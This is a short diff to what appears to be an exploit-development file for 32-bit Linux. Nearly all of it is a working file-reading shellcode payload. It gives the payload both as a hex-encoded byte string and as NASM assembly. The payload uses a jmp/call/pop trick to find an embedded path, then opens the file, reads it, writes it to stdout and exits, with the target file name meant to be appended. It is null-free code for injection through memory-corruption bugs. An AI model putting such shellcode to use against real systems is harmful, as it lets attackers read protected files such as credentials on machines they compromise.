@@ -54,3 +54,41 @@ two: #purpose: add parameter 'file_name' at the end of shellcode
 	.string "file_name"
 
 #SHELLCODE = "\x31\xC0\x31\xDB\x31\xC9\x31\xD2\xEB\x28\x5B\xB0\x05\xCD\x80\x89\xC6\xB0\x03\x89\xF3\x8D\x0C\x24\xB2\x01\xCD\x80\x31\xDB\x39\xD8\x7E\x0A\xB0\x04\xB3\x01\xB2\x01\xCD\x80\xEB\xE5\xB0\x01\x31\xDB\xCD\x80\xE8\xD3\xFF\xFF\xFF" + "file_name"
+
+#For nasm assembler
+section	.text
+	global _start       ;must be declared for using gcc
+_start:
+	xor    eax,eax
+	xor    ebx,ebx
+	xor    ecx,ecx
+	xor    edx,edx
+	jmp    two
+one:
+	pop    ebx
+	mov    al,0x5
+	int    0x80
+	mov    esi,eax
+read:
+	mov    al,0x3
+	mov    ebx,esi
+	lea    ecx,[esp]
+	mov    dl,0x1
+	int    0x80
+	xor    ebx,ebx
+	cmp    eax,ebx
+	jle    exit
+write:
+	mov    al,0x4
+	mov    bl,0x1
+	mov    dl,0x1
+	int    0x80
+	jmp    read
+exit:
+	mov    al,0x1
+	xor    ebx,ebx
+	int    0x80
+
+two:
+	call   one
+	db "/tmp/concavang/xanhlacay"
